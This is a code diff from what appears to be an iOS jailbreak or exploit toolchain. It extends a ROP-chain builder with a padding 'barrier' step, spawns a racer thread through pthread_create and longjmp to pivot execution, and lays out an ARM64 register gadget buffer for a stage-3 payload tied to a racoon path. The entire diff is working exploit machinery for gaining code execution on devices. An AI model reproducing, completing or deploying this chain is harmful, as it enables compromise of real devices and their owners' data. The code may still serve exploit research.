@@ -124,6 +124,17 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				offset_delta += next->second_val;
 				chain_pos += next->second_val;
 				break;
+			case BARRIER:
+				if (chain_pos > next->value) {
+					printf("stage 3 doesn't have enought space\n");
+				}
+				uint64_t diff = next->value - chain_pos;
+				chain_pos += diff;
+				offset_delta += diff;
+				char * tmp = malloc(diff);
+				write(fd,tmp,diff);
+				free(tmp);
+				break;
 			case ROP_VAR:
 				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
 				write(fd,&buf,8);
@@ -373,6 +384,15 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				longjmp_buf = 0;
 				pos = 0;
 				break;
+			case BARRIER:
+				if (current_addr > next->value) {
+					printf("stage 3 doesn't have enought space\n");
+				}
+				uint64_t diff = next->value - current_addr;
+				current_addr += diff;
+				offset_delta += diff;
+				printf("ADDED BARRIER HERE size: 0x%llx spans to 0x%llx\n",diff,current_addr);
+				break;
 			case ROP_VAR:
 				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
 				pos_buf = pos_description_DBG(pos,longjmp_buf);
@@ -607,7 +627,6 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
 	*/
 
-	// TODO: spawn racer thread here
 	
 	// SETUP VARS
 	char * tmp = malloc(0x1000);
@@ -688,6 +707,14 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 #define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	ADD_COMMENT(name); \
 	CALL_FUNC(get_addr_from_name(name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
+
+
+#define BARRIER_BUFFER_SIZE 0x10000
+	// spawn racer thread
+	DEFINE_ROP_VAR("racer_thread",sizeof(pthread_t),tmp);
+	ROP_VAR_ARG("racer_thread",1);
+	CALL("pthread_create",0,offsets->longjmp,offsets->stage3_base+offsets->stage3_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);
+
 
 	ADD_COMMENT("mach_task_self");
 	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name("mach_task_self"),0,0,0,0,0,0,0,0);
@@ -902,7 +929,32 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	CALL("dlopen",0,0,0,0,0,0,0,0);
 
 	// SECOND THREAD STACK STARTS HERE
-	// FIXME: we need a buffer here otherwise this chain will smash the other stack
+	ADD_BARRIER(offsets->stage3_base + offsets->stage3_max_size + BARRIER_BUFFER_SIZE);
+ 
+
+	// longjmp buf, pivoting everything
+	ADD_GADGET(); /* x19 */
+    ADD_GADGET(); /* x20 */
+    ADD_GADGET(); /* x21 */
+    ADD_GADGET(); /* x22 */
+    ADD_GADGET(); /* x23 */
+    ADD_GADGET(); /* x24 */
+    ADD_GADGET(); /* x25 */
+    ADD_GADGET(); /* x26 */
+    ADD_GADGET(); /* x27 */
+    ADD_GADGET(); /* x28 */
+    ADD_GADGET(); /* x29 */
+    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
+    ADD_GADGET(); /* x29 */ 
+    ADD_STATIC_GADGET(offsets->stage3_base + offsets->stage3_max_size + BARRIER_BUFFER_SIZE+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
+    ADD_GADGET(); /* D8 */
+    ADD_GADGET(); /* D9 */
+    ADD_GADGET(); /* D10 */
+    ADD_GADGET(); /* D11 */
+    ADD_GADGET(); /* D12 */
+    ADD_GADGET(); /* D13 */
+    ADD_GADGET(); /* D14 */
+    ADD_GADGET(); /* D15 */
 	
 	char * racer_path = malloc(100);
 	snprintf(racer_path,100,"/var/run/racoon/letsgo");
